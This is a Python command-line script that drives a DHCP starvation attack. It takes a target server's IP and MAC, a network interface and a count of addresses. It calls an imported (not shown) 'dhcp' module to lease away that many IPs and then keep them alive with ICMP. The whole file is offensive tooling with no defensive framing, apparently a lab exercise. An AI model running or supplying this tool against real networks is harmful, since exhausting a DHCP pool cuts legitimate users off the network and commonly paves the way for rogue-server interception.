import dhcp
import sys
import argparse
from scapy.all import getmacbyip

def handle_args(args):
    # Create the parser
    parser = argparse.ArgumentParser(description='Your script description')

    # Add the -d/--debug option
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')

    # Add other arguments
    parser.add_argument('--server_ip', required=True, help='IP address of the server')
    parser.add_argument('--server_mac', help='MAC address of the server')
    parser.add_argument('--interface', required=True, help='Network interface to use')
    parser.add_argument('--ips_to_starve', type=int, required=True,help='amount of IPs to occupy')

    return parser.parse_args()


dhcp.args=handle_args(sys.argv)

if dhcp.args.server_mac is None:
    dhcp.args.server_mac = getmacbyip(dhcp.args.server_ip)
    if dhcp.args.server_mac is None:
        print("cant get the server mac")
        exit(1)



occupied_ips = dhcp.starve_ips(dhcp.args.server_ip, dhcp.args.server_mac, dhcp.args.interface, dhcp.args.ips_to_starve)
if(dhcp.args.debug):
    print('We have these IP\'s')
    for ip in occupied_ips:
        print(ip)
if(len(occupied_ips) == 0):
    print('[-]No ip occupied')
    exit(1)

dhcp.keep_ips_alive_icmp(occupied_ips, dhcp.args.server_ip, dhcp.args.server_mac)

